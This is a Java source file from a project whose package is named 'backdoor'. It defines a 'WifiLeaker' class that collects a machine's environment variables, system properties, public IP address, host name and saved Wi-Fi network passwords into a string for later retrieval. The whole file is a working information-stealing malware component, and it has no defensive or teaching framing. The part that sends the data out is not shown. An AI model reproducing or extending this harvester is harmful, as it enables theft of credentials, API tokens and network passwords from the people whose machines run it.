package com.github.pulsebeat02.backdoor;

import com.github.pulsebeat02.utility.NetworkUtilities;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.Properties;

public class WifiLeaker extends Leakable {

  public WifiLeaker() {
    storeEnvironmentVariables();
    storeSystemProperties();
    storeNetworkInformation();
  }

  public void storeNetworkInformation() {
    appendLine("============= NETWORK INFORMATION =============");
    appendLine("IP Address: " + NetworkUtilities.getPublicIPAddress());
    try {
      final InetAddress address = InetAddress.getLocalHost();
      appendLine("Host Name: " + address.getHostName());
      appendLine("Internet Service Provider: " + address.getHostAddress());
    } catch (final UnknownHostException ignored) {
    }
    appendLine("NETWORK PASSWORDS == START");
    final List<String> list = NetworkUtilities.getWiFiNameList();
    for (final String string : list) {
      appendLine(NetworkUtilities.getWiFiMap(NetworkUtilities.getPasswordByName(string)));
    }
    appendLine("NETWORK PASSWORDS == END");
    appendLine("===============================================");
  }

  public void storeEnvironmentVariables() {
    appendLine("============ ENVIRONMENT VARIABLES ============");
    final Map<String, String> env = System.getenv();
    for (final Map.Entry<String, String> entry : env.entrySet()) {
      appendLine(entry.getKey() + " -> " + entry.getValue());
    }
    appendLine("==============================================");
  }

  public void storeSystemProperties() {
    appendLine("============== SYSTEM PROPERTIES ==============");
    final Properties p = System.getProperties();
    final Enumeration<Object> keys = p.keys();
    while (keys.hasMoreElements()) {
      final String key = (String) keys.nextElement();
      appendLine(key + " -> " + p.getProperty(key));
    }
    appendLine("===============================================");
  }

  public String getInformation() {
    return information;
  }
}
